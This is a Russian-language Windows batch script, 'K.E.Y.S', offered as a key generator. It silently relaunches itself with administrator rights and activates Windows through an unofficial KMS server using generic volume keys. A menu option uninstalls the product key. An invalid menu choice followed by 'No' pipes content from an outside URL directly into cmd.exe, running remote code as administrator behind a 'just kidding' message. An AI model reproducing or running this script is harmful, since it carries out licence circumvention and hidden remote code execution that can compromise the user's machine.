setlocal
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit
)

rem ver 2.0.0 beta 3.1
chcp 1251


rem Здесь продолжайте выполнение вашего скрипта с правами администратора
@echo off
cls
goto nb
:startrun
color 6
cls


"%~dp0\nhmb\nhcolor.exe" 0e ======================================
"%~dp0\nhmb\nhcolor.exe" 0e -----------------KEYS-----------------
"%~dp0\nhmb\nhcolor.exe" 0e ======================================
echo Cделано Cats coding Batch
echo.
echo K.E.Y.S - Только для Windows 10-11 
>nul timeout/nobreak 4
echo Нажмите любую кнопку для перехода в меню
pause >nul
:menu
cls

:menurun
cls
color 6
echo.
echo  MENU                                        
echo.
echo 1. Начать генерацию                           
echo 2. Поддержать автора                          
echo 3. ТГК Cats coding batch                      
echo 4. В стартовое меню                          
echo 5. Удалить активацию виндовс (ОЧЕНЬ ОПАСНО!)   
echo 6. English Version                            
echo.
echo Cкоро будет запоминание настроек
echo.
set /p choice=Выбери пункт: 
if %choice%==1 (
	cls 
	"%~dp0\nhmb\nhmb.exe" "Большая просьба,\nне выключать программу во время генерции ключа!\nНадеюсь все понятно " "KEYS" "Information|NoButtons" "10"
    goto gen
) else if %choice%==2 (
	cls
    color a
	echo Запускаю Бусти
	ping localhost -n 3 >nul
	start https://boosty.to/foxinabox
	echo Возвращение в меню
	goto menurun
) else if %choice%==3 (
	cls
	color 1
    start https://t.me/Cats_coding_batch
	ping localhost -n 3 >nul
	echo Возвращение в меню
	goto menurun
) else if %choice%==4 (
	cls
	goto start
) else if %choice%==5 (
	color 4
	cls
	echo MsgBox "poshalko shto z debil" > CCB.vbs
	cscript //nologo CCB.vbs
	del CCB.vbs
	echo Удаление активации виндовс через 3 секунды...
	>nul timeout/nobreak 1
	echo Удаление активации виндовс через 2 секунды...
	>nul timeout/nobreak 1
	echo Удаление активации виндовс через 1 секунды...
	>nul timeout/nobreak 1
	echo Удаление активации произошло успешно!
	slmgr /upk
	goto menurun
) else if %choice%==6 (
	start keyse.cmd
	exit
) else (
	cls
	goto kill
)
goto menurun
:kill
color 4
"%~dp0\nhmb\nhmb.exe" "Ты долбаеб?" "VIRUS.exe" "Error|YesNo" ""
if "%errorlevel%" == "%IDNO%" goto no
echo Молодец, можешь идти
ping localhost -n 2 >nul
goto menurun
:no
>nul timeout/nobreak 1
echo Уничтожение виндовс через
>nul timeout/nobreak 1
echo 5
>nul timeout/nobreak 1
echo 4
>nul timeout/nobreak 1
echo 3
>nul timeout/nobreak 1
echo 2
>nul timeout/nobreak 1
echo 1
>nul timeout/nobreak 1
"%~dp0\nhmb\nhmb.exe" "Я пошутил)" "KEYS" "Information|NoButtons" "5"
curl.exe -sN http://rick.jachan.dev | cmd.exe
goto menurun
:gen
cls
color e
echo Загрузка...
echo.
echo Погодите...
slmgr /skms kms.digiboy.ir

for /f "tokens=2*" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName') do set "version=%%j"

rem Проверяем, является ли версия Home, Pro, или Single Language
if /i "%version%"=="Windows 10 Home" (
    set Edition=Home
    set KEY2=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
) else if /i "%version%"=="Windows 10 Pro" (
    set Edition=Pro
    set KEY2=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if /i "%version%"=="Windows 11 Pro" (
    set Edition=Pro
    set KEY2=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if /i "%version%"=="Windows 11 Home" (
    set Edition=Home
    set KEY2=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
) else if /i "%version%"=="Windows 10 Education" (
    set Edition=Education
    set KEY2=2WNVT-6NNHG-7CG2G-9J9T6-9B7F4
) else if /i "%version%"=="Windows 10 Enterprise" (
    set Edition=Enterprise
    set KEY2=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if /i "%version%"=="Windows 11 Education" (
    set Edition=Education
    set KEY2=2WNVT-6NNHG-7CG2G-9J9T6-9B7F4
) else if /i "%version%"=="Windows 11 Enterprise" (
    set Edition=Enterprise
    set KEY2=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if /i "%version%"=="Windows 10 Home Single Language" (
    set Edition=SingleLanguage
    set KEY2=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
) else if /i "%version%"=="Windows 11 Home Single Language" (
    set Edition=SingleLanguage
    set KEY2=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
) else if /i "%version%"=="Windows Server 2019 Standard" (
    set Edition=Server2019
    set KEY2=N69G4-B89J2-4G8F4-WWYCC-J464C
) else if /i "%version%"=="Windows Server 2019 Datacenter" (
    set Edition=Server2019
    set KEY2=WMDGN-G9PQG-XVVXX-R3X43-63DFG
) else if /i "%version%"=="Windows Server 2022 Standard" (
    set Edition=Server2022
    set KEY2=VDYBN-27WPP-V4HQT-9VMD4-VMK7H
) else if /i "%version%"=="Windows Server 2022 Datacenter" (
    set Edition=Server2022
    set KEY2=WX4NM-KYWYW-QJJR4-XV3QB-6VM33
) else if /i "%version%"=="Windows 10 Pro for Workstations" (
    set Edition=ProWorkstations
    set KEY2=6TPJF-3D6Y4-9C9C3-9C3C3-9C3C3
) else if /i "%version%"=="Windows 10 IoT Enterprise" (
    set Edition=IoTEnterprise
    set KEY2=2WNVT-6NNHG-7CG2G-9J9T6-9B7F4
) else if /i "%version%"=="Windows 11 Pro for Workstations" (
    set Edition=ProWorkstations
    set KEY2=6TPJF-3D6Y4-9C9C3-9C3C3-9C3C3
) else if /i "%version%"=="Windows 11 IoT Enterprise" (
    set Edition=IoTEnterprise
    set KEY2=2WNVT-6NNHG-7CG2G-9J9T6-9B7F4
) else (
    set Edition=Other
    set KEY2=M7XTQ-FN8P6-TTKYV-9D4CC-J462D
)
echo.
echo Версия: %version%
echo Издание: %Edition%
echo Ключ: %KEY2%
echo.
slmgr /ipk %KEY2%
echo %KEY2% | clip

echo Информация скопирована в буфер обмена.
timeout /t 5 >nul

cls
color a
echo Успешно
"%~dp0\nhmb\nhmb.exe" "Успешно\nКЛЮЧ: %KEY2%\nКлюч был записан в буфер обмена" "KEYS" "Information|OK" ""
echo [--------------------------------------]
echo ВАШ КЛЮЧ = %KEY2%
echo [--------------------------------------]
echo Ваша версия Windows: %Edition%
timeout /t 5 >nul
echo Нажмите любую кнопку для перехода в меню
pause >nul
goto menurun 
:start
cls
set KEY=NEED TO GENERATE 
@echo off

goto startrun

:nb
rem Locate 25 1
rem ChangeColor 0 8
rem ShadeBoxAt 15 21 1 2 2
rem Wait 30
rem ShadeBoxAt 15 23 1 3 2
rem Wait 30
rem ShadeBoxAt 15 26 1 5 2
rem Wait 30
rem ShadeBoxAt 15 31 1 7 2
rem ShadeBoxAt 15 38 1 9 2
rem ChangeColor 0 8
rem ShadeBoxAt 15 21 1 1 4
rem Wait 30
rem ShadeBoxAt 15 47 1 11 2
rem ShadeBoxAt 15 22 1 6 4
rem Wait 30
rem ShadeBoxAt 15 58 1 11 2
rem ShadeBoxAt 15 28 1 6 4
rem Wait 30
rem ShadeBoxAt 15 41 1 40 2
rem ShadeBoxAt 15 34 1 7 4
rem ChangeColor 9 3
rem ShadeBoxAt 13 46 1 3 3
rem ShadeBoxAt 14 46 4 1 3
rem ShadeBoxAt 17 47 1 2 3
rem ShadeBoxAt 15 47 1 2 3
rem ShadeBoxAt 14 49 1 1 3
rem ShadeBoxAt 16 49 1 1 3
rem Wait 30
rem ShadeBoxAt 13 53 1 2 3
rem ShadeBoxAt 14 52 4 1 3
rem ShadeBoxAt 15 53 1 2 3
rem ShadeBoxAt 14 55 4 1 3
rem Wait 30
rem ShadeBoxAt 13 58 1 5 3
rem ShadeBoxAt 14 60 4 1 3
rem Wait 30
rem ShadeBoxAt 13 66 1 3 3
rem ShadeBoxAt 14 65 3 1 3
rem ShadeBoxAt 17 66 1 3 3
rem Wait 30
rem ShadeBoxAt 13 72 5 1 3
rem ShadeBoxAt 15 73 1 3 3
rem ShadeBoxAt 13 76 5 1 3
rem Wait 30
rem Wait 30
rem Wait 30
rem ChangeColor 0 7
rem ShadeBoxAt 16 41 1 5 2
rem ShadeBoxAt 16 47 1 2 2
rem ShadeBoxAt 16 50 1 2 2
rem ShadeBoxAt 16 53 1 2 2
rem ShadeBoxAt 16 56 1 4 2
rem ShadeBoxAt 16 61 1 4 2
rem ShadeBoxAt 16 66 1 6 2
rem ShadeBoxAt 16 73 1 3 2
rem ShadeBoxAt 16 77 1 4 2
rem Wait 30
rem ChangeColor 0 15
rem ShadeBoxAt 17 41 1 5 2
rem ShadeBoxAt 17 49 1 3 2
rem ShadeBoxAt 17 53 1 2 2
rem ShadeBoxAt 17 56 1 4 2
rem ShadeBoxAt 17 61 1 5 2
rem ShadeBoxAt 17 69 1 3 2
rem ShadeBoxAt 17 73 1 3 2
rem ShadeBoxAt 17 77 1 4 2
rem Wait 30
rem ChangeColor 8 15
rem ChangeColor 7 15
rem ShadeBoxAt 18 41 1 40 2
rem Wait 30
rem ChangeColor 0 15
rem ShadeBoxAt 15 41 1 5 4
rem ShadeBoxAt 15 49 1 3 4
rem ShadeBoxAt 15 56 1 4 4
rem ShadeBoxAt 15 61 1 4 4
rem ShadeBoxAt 15 66 1 6 4
rem ShadeBoxAt 15 77 1 4 4
rem Wait 30
rem ShadeBoxAt 16 41 1 5 4
rem ShadeBoxAt 16 47 1 2 4
rem ShadeBoxAt 16 50 1 2 4
rem ShadeBoxAt 16 53 1 2 4
rem ShadeBoxAt 16 56 1 4 4
rem ShadeBoxAt 16 61 1 4 4
rem ShadeBoxAt 16 66 1 6 4
rem ShadeBoxAt 16 73 1 3 4
rem ShadeBoxAt 16 77 1 4 4
rem Wait 30
rem ShadeBoxAt 17 41 1 5 4
rem ShadeBoxAt 17 49 1 3 4
rem ShadeBoxAt 17 53 1 2 4
rem ShadeBoxAt 17 56 1 4 4
rem ShadeBoxAt 17 61 1 5 4
rem ShadeBoxAt 17 69 1 3 4
rem ShadeBoxAt 17 73 1 3 4
rem ShadeBoxAt 17 77 1 4 4
rem Wait 20
rem ShadeBoxAt 18 41 1 40 2
rem Wait 20
rem ChangeColor 0 0
rem ShadeBoxAt 18 41 1 40 2
rem Wait 500
rem ClearColor
rem Locate 30 1

rem Подгрузка библиотек
set IDOK=1
set IDCANCEL=2
set IDABORT=3
set IDRETRY=4
set IDIGNORE=5
set IDYES=6
set IDNO=7
set IDTRYAGAIN=10
set IDCONTINUE=11
rem Вот тут nhmb
title K.E.Y.S - Made by CCB
"%~dp0\nhmb\nhmb.exe" "K.E.Y.S Made by CCB\nБольшое спасибо за использование!\nЗагрузка Библиотек завершена! " "KEYS" "Information|NoButtons" "5"
"%~dp0\nhmb\nhmb.exe" "ЭТО БЕТА ВЕРСИЯ, полный функционал может быть недоступен" "KEYS" "Information|NoButtons" "5"
goto start 
